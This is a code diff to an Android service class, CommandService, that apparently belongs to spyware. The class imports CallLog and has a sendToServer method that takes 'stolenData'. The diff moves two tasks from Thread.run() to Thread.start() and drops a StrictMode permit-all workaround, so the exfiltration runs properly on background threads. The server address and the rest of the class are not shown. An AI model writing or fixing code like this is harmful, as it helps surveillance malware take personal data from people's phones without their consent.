@@ -11,7 +11,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
-import android.os.StrictMode;
 import android.os.Vibrator;
 import android.provider.CallLog;
 import android.util.Log;
@@ -218,15 +217,10 @@ public class CommandService extends Service {
                     e.printStackTrace();
                 }
             }
-        }).run();
+        }).start();
     }
 
     private void sendToServer(final byte[] stolenData) {
-
-        if (android.os.Build.VERSION.SDK_INT > 9) {
-            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-            StrictMode.setThreadPolicy(policy);
-        }
 
         new Thread(new Runnable() {
             @Override
@@ -265,6 +259,6 @@ public class CommandService extends Service {
                     Log.d(TAG, "EXCEPTION IN sendToServer");
                 }
             }
-        }).run();
+        }).start();
     }
 }
